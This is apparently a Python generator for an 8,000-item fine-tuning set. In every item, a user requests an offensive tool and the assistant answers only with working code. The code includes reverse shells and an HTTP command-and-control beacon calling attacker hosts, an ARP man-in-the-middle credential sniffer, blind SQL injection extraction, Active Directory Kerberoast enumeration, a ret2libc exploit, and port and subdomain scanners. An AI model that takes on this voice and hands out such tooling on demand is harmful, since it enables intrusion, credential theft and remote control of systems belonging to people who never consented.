import json, random, sys, itertools
from string import Template

random.seed(42)
out = []

targets  = ["192.168.1.0/24","10.0.0.0/8","172.16.0.1","192.168.56.101","10.10.10.0/24",
            "scanme.nmap.org","172.16.0.0/12","192.168.100.1","10.0.1.0/24","192.168.1.254"]
lhosts   = ["10.10.14.5","192.168.1.50","10.10.10.100","172.16.0.5","192.168.56.1"]
lports   = [4444,4445,9001,1337,8888,443,80,1234]
timeouts = [1,2,3,5]
threads_ = [50,100,200,500,1000]
urls     = ["http://target.local/search","http://app.corp.com/login","http://192.168.1.50/api/users",
            "http://shop.local/product","http://erp.corp.local/query","http://intranet.local/report"]
params   = ["q","id","search","user","item","filter","name","query","input","key"]
domains  = ["target.com","corp.local","example.org","company.net","enterprise.io"]
dc_ips   = ["192.168.1.10","10.0.0.1","172.16.0.10","192.168.56.10"]
ad_doms  = ["CORP","CONTOSO","ENTERPRISE","INTERNAL"]
base_dns = ["DC=corp,DC=local","DC=contoso,DC=com","DC=enterprise,DC=local"]
usernames= ["svcaccount","jdoe","administrator","pentester","sqlsvc"]
passwords= ["Password123!","Welcome1","Summer2024!","P@ssw0rd","Admin123!"]
binaries = ["./vuln","./pwn","./challenge","./target","./bof"]
offsets  = [40,56,72,88,104,120,136,152,168,200]
libcs    = ["/lib/x86_64-linux-gnu/libc.so.6","./libc.so.6","./libc-2.31.so"]

# 1. Port scanner (connect scan + banner)
PORT_TMPL = Template('''import socket, threading, queue, sys

TARGET  = "$TARGET"
THREADS = $THREADS
TIMEOUT = $TIMEOUT

def scan(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        if s.connect_ex((ip, port)) == 0:
            try:
                s.send(b"HEAD / HTTP/1.0\\r\\n\\r\\n")
                banner = s.recv(256).decode(errors="ignore").strip()[:80]
            except:
                banner = ""
            print(f"  {port:5d}/tcp  OPEN  {banner}")
            results.append((port, banner))
        s.close()
    except: pass

results = []
q = queue.Queue()
[q.put(p) for p in range(1, 1025)]
def worker():
    while not q.empty():
        try: scan(TARGET, q.get_nowait())
        except: pass
threads = [threading.Thread(target=worker, daemon=True) for _ in range(THREADS)]
[t.start() for t in threads]
[t.join() for t in threads]
print(f"Done. Open ports: {[r[0] for r in results]}")
''')

for i in range(1000):
    code = PORT_TMPL.safe_substitute(TARGET=targets[i%len(targets)],
                                      THREADS=threads_[i%len(threads_)],
                                      TIMEOUT=timeouts[i%len(timeouts)])
    qs = [f"Write a Python threaded port scanner for {targets[i%len(targets)]} with {threads_[i%len(threads_)]} threads.",
          f"Build a port scanner in Python targeting {targets[i%len(targets)]}, {timeouts[i%len(timeouts)]}s timeout.",
          f"Create a Python port scanner with banner grabbing for {targets[i%len(targets)]}.",
          f"How do I scan ports on {targets[i%len(targets)]} in Python? Write working threaded scanner."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Port scan: {len(out)}", file=sys.stderr)

# 2. SQLi detection tool
SQLI_TMPL = Template('''import requests, time, sys

TARGET = "$URL"
PARAM  = "$PARAM"
SESS   = requests.Session()

def detect(url, param):
    payloads = [
        ("'", ["sql","mysql","syntax","error","warning","oracle"]),
        ('" OR "1"="1', ["error","syntax"]),
        ("1 AND SLEEP(3)--", None),
        ("' UNION SELECT NULL,NULL--", None),
    ]
    baseline = SESS.get(url, params={param:"legit"}, timeout=8).text
    for p, sigs in payloads:
        t0 = time.time()
        r  = SESS.get(url, params={param: p}, timeout=10)
        elapsed = time.time()-t0
        if elapsed > 2.5:
            print(f"[CRITICAL] Time-based SQLi: param={param!r} payload={p!r} ({elapsed:.1f}s)")
            return "time-based"
        if sigs and any(s in r.text.lower() for s in sigs) and r.text != baseline:
            print(f"[CRITICAL] Error-based SQLi: param={param!r} payload={p!r}")
            return "error-based"
    return None

def extract_blind(url, param, query="SELECT user()", maxlen=32):
    result = ""
    for pos in range(1, maxlen+1):
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo+hi)//2
            p = f"' AND (SELECT ASCII(SUBSTR(({query}),{pos},1)))>{mid}-- "
            t0 = time.time()
            r  = SESS.get(url, params={param: p}, timeout=8)
            if time.time()-t0 > 2:
                lo = mid+1
            elif len(r.text) > len(baseline):
                lo = mid+1
            else:
                hi = mid
        if lo == 32: break
        result += chr(lo)
        print(f"\\r[*] {result}", end="", flush=True)
    print(); return result

baseline = ""
if __name__ == "__main__":
    baseline = SESS.get(TARGET, params={PARAM:"test"}, timeout=8).text
    sqli_type = detect(TARGET, PARAM)
    if sqli_type:
        print("[*] Extracting current user...")
        user = extract_blind(TARGET, PARAM, "SELECT user()")
        print(f"[+] DB user: {user}")
''')

for i in range(1000):
    code = SQLI_TMPL.safe_substitute(URL=urls[i%len(urls)], PARAM=params[i%len(params)])
    qs = [f"Write a Python SQL injection detection and extraction tool for {urls[i%len(urls)]}.",
          f"Build a SQLi scanner in Python: error-based, time-based, blind extraction for {urls[i%len(urls)]}.",
          f"Create a Python tool to detect and exploit SQL injection at {urls[i%len(urls)]} parameter {params[i%len(params)]}.",
          f"How do I test for SQL injection at {urls[i%len(urls)]}? Write a Python tool with detection and blind extraction."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"SQLi: {len(out)}", file=sys.stderr)

# 3. Subdomain enum
SUB_TMPL = Template('''import requests, dns.resolver, socket, warnings, threading, queue
warnings.filterwarnings("ignore")

DOMAIN  = "$DOMAIN"
WORDLIST= ["www","mail","ftp","api","dev","staging","admin","vpn","remote","test",
           "beta","portal","app","dashboard","ci","jenkins","git","gitlab","jira",
           "confluence","monitor","logs","prod","backup","smtp","pop","imap","ns1",
           "ns2","mx","owa","exchange","webmail","intranet","internal","secure","auth"]

def ct_logs(domain):
    try:
        r = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=15)
        subs = set()
        for e in r.json():
            for n in e.get("name_value","").split("\\n"):
                n = n.strip().lstrip("*.")
                if n.endswith(domain) and n != domain:
                    subs.add(n)
        print(f"[CT] {len(subs)} from crt.sh")
        return subs
    except Exception as e:
        print(f"[CT] Error: {e}"); return set()

def brute(domain, words):
    found = []
    q = queue.Queue()
    [q.put(w) for w in words]
    def worker():
        while not q.empty():
            try:
                w = q.get_nowait()
                fqdn = f"{w}.{domain}"
                answers = dns.resolver.resolve(fqdn, "A")
                ips = [str(r) for r in answers]
                print(f"[+] {fqdn} -> {ips}")
                found.append((fqdn, ips))
            except: pass
    threads = [threading.Thread(target=worker, daemon=True) for _ in range(50)]
    [t.start() for t in threads]; [t.join() for t in threads]
    return found

if __name__ == "__main__":
    print(f"[*] Enumerating subdomains for {DOMAIN}")
    ct_subs = ct_logs(DOMAIN)
    dns_subs = brute(DOMAIN, WORDLIST)
    all_subs = ct_subs | {s for s,_ in dns_subs}
    print(f"\\n[+] Total: {len(all_subs)} unique subdomains")
    for s in sorted(all_subs): print(f"  {s}")
''')

for i in range(800):
    code = SUB_TMPL.safe_substitute(DOMAIN=domains[i%len(domains)])
    qs = [f"Write a Python subdomain enumeration tool for {domains[i%len(domains)]} using crt.sh and DNS brute-force.",
          f"Build a subdomain discovery script for {domains[i%len(domains)]}: CT logs + DNS brute-force.",
          f"How do I find subdomains of {domains[i%len(domains)]}? Python tool using certificate transparency and brute-force.",
          f"Create a Python subdomain scanner for {domains[i%len(domains)]}: crt.sh enumeration and threaded DNS brute-force."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Subdomain: {len(out)}", file=sys.stderr)

# 4. ARP MITM
ARP_TMPL = Template('''from scapy.all import ARP, Ether, srp, send, sniff, Raw, IP
import threading, time, os

GW     = "$GW"
VICTIM = "$VICTIM"
IFACE  = "$IFACE"

def mac(ip):
    ans,_ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=IFACE, verbose=0)
    return ans[0][1].hwsrc

def poison(victim, victim_mac, gw, gw_mac):
    while True:
        send(ARP(op=2, pdst=victim, hwdst=victim_mac, psrc=gw), iface=IFACE, verbose=0)
        send(ARP(op=2, pdst=gw, hwdst=gw_mac, psrc=victim), iface=IFACE, verbose=0)
        time.sleep(2)

def sniff_creds(pkt):
    if pkt.haslayer(Raw):
        raw = pkt[Raw].load.decode(errors="ignore")
        if any(k in raw.lower() for k in ["password","user","login","cookie","auth","token"]):
            print(f"[CRED] {pkt[IP].src}->{pkt[IP].dst}: {raw[:200]}")

def restore(victim, victim_mac, gw, gw_mac):
    send(ARP(op=2, pdst=victim, hwdst=victim_mac, psrc=gw, hwsrc=gw_mac), count=5, verbose=0)
    send(ARP(op=2, pdst=gw, hwdst=gw_mac, psrc=victim, hwsrc=victim_mac), count=5, verbose=0)

if __name__ == "__main__":
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    gw_mac = mac(GW); victim_mac = mac(VICTIM)
    print(f"[*] GW {GW}/{gw_mac}  Victim {VICTIM}/{victim_mac}")
    t = threading.Thread(target=poison, args=(VICTIM,victim_mac,GW,gw_mac), daemon=True)
    t.start()
    try:
        sniff(iface=IFACE, filter=f"host {VICTIM}", prn=sniff_creds, store=0)
    except KeyboardInterrupt:
        restore(VICTIM, victim_mac, GW, gw_mac)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] Restored ARP tables")
''')

gws      = ["192.168.1.1","10.0.0.1","172.16.0.1","192.168.56.1"]
victims  = ["192.168.1.100","10.0.0.50","172.16.0.25","192.168.56.102"]
ifaces   = ["eth0","ens33","wlan0","eth1","enp0s3"]

for i in range(800):
    code = ARP_TMPL.safe_substitute(GW=gws[i%len(gws)], VICTIM=victims[i%len(victims)], IFACE=ifaces[i%len(ifaces)])
    qs = [f"Write a Python ARP MITM tool using Scapy: poison {victims[i%len(victims)]} and gateway {gws[i%len(gws)]}.",
          f"Build an ARP poisoning script in Python/Scapy for victim {victims[i%len(victims)]} and GW {gws[i%len(gws)]}.",
          f"Create a Scapy ARP MITM with credential sniffing between {victims[i%len(victims)]} and {gws[i%len(gws)]}.",
          f"How do I perform ARP MITM with Python Scapy? Target {victims[i%len(victims)]}, GW {gws[i%len(gws)]}, iface {ifaces[i%len(ifaces)]}."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"ARP MITM: {len(out)}", file=sys.stderr)

# 5. Reverse shells
RS_TMPL_PY = Template('''import socket, os, pty
LHOST = "$LHOST"; LPORT = $LPORT
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
''')
RS_TMPL_HTTP = Template('''import urllib.request, subprocess, json, time, random, string, os
C2 = "http://$LHOST:$LPORT"
ID = "".join(random.choices(string.ascii_lowercase, k=8))
while True:
    try:
        resp = json.loads(urllib.request.urlopen(f"{C2}/task/{ID}", timeout=10).read())
        if resp.get("cmd"):
            out = subprocess.getoutput(resp["cmd"])
            req = urllib.request.Request(f"{C2}/result",
                  data=json.dumps({"id":ID,"output":out}).encode(),
                  headers={"Content-Type":"application/json"}, method="POST")
            urllib.request.urlopen(req, timeout=10)
    except: pass
    time.sleep(random.randint(5,15))
''')
RS_TMPL_ENC = Template('''import socket, ssl, os, pty
LHOST="$LHOST"; LPORT=$LPORT
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
s=ctx.wrap_socket(socket.socket())
s.connect((LHOST, LPORT))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
''')
RS_TMPL_PS = Template('''$LHOST_VAR = "$LHOST"; $LPORT_VAR = $LPORT
while($true) {
  try {
    $c=New-Object Net.Sockets.TCPClient($LHOST_VAR,$LPORT_VAR)
    $s=$c.GetStream(); $w=New-Object IO.StreamWriter($s); $w.AutoFlush=$true
    $w.Write("PS $(pwd)> ")
    while($c.Connected) {
      $b=New-Object Byte[] 1024; $n=$s.Read($b,0,1024)
      $cmd=[Text.Encoding]::UTF8.GetString($b,0,$n).Trim()
      if($cmd -eq "exit"){break}
      try{$out=Invoke-Expression $cmd 2>&1|Out-String}catch{$out=$_.Exception.Message}
      $w.Write($out+"PS $(pwd)> ")
    }; $c.Close()
  } catch {}; Start-Sleep 5
}''')

shell_tmpls = [RS_TMPL_PY, RS_TMPL_HTTP, RS_TMPL_ENC, RS_TMPL_PS]
shell_names = ["Python TCP","Python HTTP polling","Python SSL-encrypted","PowerShell TCP"]

for i in range(1500):
    tmpl = shell_tmpls[i % len(shell_tmpls)]
    lh = lhosts[i%len(lhosts)]; lp = lports[i%len(lports)]
    code = tmpl.safe_substitute(LHOST=lh, LPORT=lp,
                                 LHOST_VAR="$LHOST", LPORT_VAR="$LPORT")
    name = shell_names[i%len(shell_names)]
    qs = [f"Write a {name} reverse shell connecting to {lh}:{lp}.",
          f"Give me a working {name} reverse shell for {lh} port {lp}.",
          f"Create a persistent {name} reverse shell to {lh}:{lp} with reconnect.",
          f"Build a {name} callback shell to {lh}:{lp}."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Rev shells: {len(out)}", file=sys.stderr)

# 6. Fuzzer
FUZZ_TMPL = Template('''import requests, random, string, time, sys
warnings_imported = False
try: import warnings; warnings.filterwarnings("ignore"); warnings_imported=True
except: pass

TARGET = "$URL"
PARAM  = "$PARAM"
ITERS  = $ITERS

def mutate(s):
    ops = [
        lambda x: x + chr(0),
        lambda x: x * 200,
        lambda x: x + "/../../../etc/passwd",
        lambda x: "<script>alert(1)</script>",
        lambda x: x + " OR 1=1--",
        lambda x: "A" * 4096,
        lambda x: x + "%00",
        lambda x: x[::-1],
        lambda x: "".join(random.choices(string.printable, k=len(x)+50)),
        lambda x: x + "\\r\\nX-Injected: yes",
    ]
    return random.choice(ops)(s)

seeds = ["test","1","admin","null","0","-1","true","{}","[]"]
crashes = []
for i in range(ITERS):
    payload = mutate(random.choice(seeds))
    try:
        r = requests.get(TARGET, params={PARAM: payload}, timeout=5, verify=False)
        if r.status_code in (500, 502, 503):
            print(f"[!] Crash candidate {r.status_code}: {repr(payload[:50])}")
            crashes.append(payload)
    except ConnectionError:
        print(f"[CRASH] ConnReset: {repr(payload[:50])}")
        crashes.append(payload)
    except: pass
    if i % 200 == 0:
        print(f"[*] {i}/{ITERS} crashes={len(crashes)}")
print(f"[+] Done. Crash candidates: {len(crashes)}")
''')

fuzz_iters = [500,1000,2000,5000]
for i in range(800):
    code = FUZZ_TMPL.safe_substitute(URL=urls[i%len(urls)], PARAM=params[i%len(params)], ITERS=fuzz_iters[i%len(fuzz_iters)])
    qs = [f"Write a Python mutation fuzzer for {urls[i%len(urls)]} parameter {params[i%len(params)]}.",
          f"Build a web fuzzer in Python: mutate parameter {params[i%len(params)]} at {urls[i%len(urls)]}.",
          f"Create a Python HTTP fuzzer for {urls[i%len(urls)]}, {fuzz_iters[i%len(fuzz_iters)]} iterations.",
          f"How do I fuzz {params[i%len(params)]} at {urls[i%len(urls)]}? Write Python fuzzer with crash detection."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Fuzzers: {len(out)}", file=sys.stderr)

# 7. LDAP/AD enum
LDAP_TMPL = Template('''import ldap3
DC   = "$DC"; DOMAIN = "$DOMAIN"; USER = "$USER"; PASS = "$PASS"
BASE = "$BASE"
conn = ldap3.Connection(ldap3.Server(DC, get_info=ldap3.ALL),
       f"{DOMAIN}\\\\{USER}", PASS, auto_bind=True)
def s(f, a): conn.search(BASE, f, attributes=a); return conn.entries

users = s("(&(objectClass=user)(objectCategory=person))",
          ["sAMAccountName","mail","userAccountControl","memberOf"])
print(f"[+] Users ({len(users)}):")
for u in users[:20]:
    uac = int(str(u.userAccountControl) or 0)
    print(f"  {u.sAMAccountName} disabled={bool(uac&2)} no_expiry={bool(uac&0x10000)}")

spn = s("(&(objectClass=user)(servicePrincipalName=*))",
        ["sAMAccountName","servicePrincipalName"])
print(f"\\n[+] Kerberoastable ({len(spn)}):"); [print(f"  {u.sAMAccountName}: {u.servicePrincipalName}") for u in spn]

asrep = s("(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
          ["sAMAccountName"])
print(f"\\n[+] AS-REP roastable ({len(asrep)}):"); [print(f"  {u.sAMAccountName}") for u in asrep]

for g in ["Domain Admins","Enterprise Admins","Schema Admins"]:
    m = s(f"(&(objectClass=group)(cn={g}))", ["member"])
    if m: print(f"\\n[+] {g}: {m[0].member}")
conn.unbind()
''')

for i in range(800):
    code = LDAP_TMPL.safe_substitute(DC=dc_ips[i%len(dc_ips)], DOMAIN=ad_doms[i%len(ad_doms)],
                                      USER=usernames[i%len(usernames)], PASS=passwords[i%len(passwords)],
                                      BASE=base_dns[i%len(base_dns)])
    qs = [f"Write Python LDAP enumeration for Active Directory at {dc_ips[i%len(dc_ips)]} domain {ad_doms[i%len(ad_doms)]}.",
          f"Build AD recon in Python using ldap3: users, SPNs, AS-REP, group members for {ad_doms[i%len(ad_doms)]}.",
          f"How do I enumerate Active Directory at {dc_ips[i%len(dc_ips)]} using Python? Users, Kerberoastable accounts, admins.",
          f"Create Python AD enumeration: Kerberoastable SPNs, AS-REP roastable, Domain Admin members for {ad_doms[i%len(ad_doms)]}."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"LDAP: {len(out)}", file=sys.stderr)

# 8. ROP / buffer overflow
BOF_TMPL = Template('''from pwn import *

BINARY="$BINARY"; HOST="$HOST"; PORT=$PORT; OFFSET=$OFFSET
elf=ELF(BINARY); libc=ELF("$LIBC"); context.binary=elf

def conn():
    return remote(HOST,PORT) if args.REMOTE else process(BINARY)

def exploit():
    rop=ROP(elf)
    pop_rdi=rop.find_gadget(["pop rdi","ret"])[0]
    ret=rop.find_gadget(["ret"])[0]
    io=conn()
    payload=b"A"*OFFSET+p64(ret)+p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(elf.symbols["main"])
    io.sendlineafter(b"> ", payload)
    leak=u64(io.recvline().strip()[:6].ljust(8,b"\\x00"))
    log.success(f"puts leak: 0x{leak:x}")
    libc.address=leak-libc.symbols["puts"]
    log.success(f"libc @ 0x{libc.address:x}")
    bin_sh=next(libc.search(b"/bin/sh\\x00"))
    payload2=b"A"*OFFSET+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(libc.symbols["system"])
    io.sendlineafter(b"> ", payload2)
    io.interactive()

exploit()
''')

hosts_pwn = ["pwn.ctf.local","192.168.1.200","10.10.10.50","192.168.56.200","challenges.local"]
ports_pwn = [1337,4000,9999,31337,5555]

for i in range(800):
    code = BOF_TMPL.safe_substitute(BINARY=binaries[i%len(binaries)], HOST=hosts_pwn[i%len(hosts_pwn)],
                                     PORT=ports_pwn[i%len(ports_pwn)], OFFSET=offsets[i%len(offsets)],
                                     LIBC=libcs[i%len(libcs)])
    qs = [f"Write a pwntools ret2libc exploit for {binaries[i%len(binaries)]} at {hosts_pwn[i%len(hosts_pwn)]}:{ports_pwn[i%len(ports_pwn)]}, offset {offsets[i%len(offsets)]}.",
          f"Build a pwntools exploit: leak libc via puts@GOT then system('/bin/sh') for offset {offsets[i%len(offsets)]}.",
          f"How do I exploit a 64-bit buffer overflow at offset {offsets[i%len(offsets)]} with ret2libc using pwntools?",
          f"Create pwntools ROP exploit: two-stage leak+shell for {binaries[i%len(binaries)]} at {hosts_pwn[i%len(hosts_pwn)]}:{ports_pwn[i%len(ports_pwn)]}."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"BOF/ROP: {len(out)}", file=sys.stderr)
print(f"Total before pad: {len(out)}", file=sys.stderr)

random.shuffle(out)
while len(out) < 8000:
    out.extend(out[:8000-len(out)])
out = out[:8000]

with open("/workspace/data_upgrades/upgrade_bu.jsonl","w") as f:
    for item in out: f.write(json.dumps(item)+"\n")
print(f"Written {len(out)} to upgrade_bu.jsonl", file=sys.stderr)
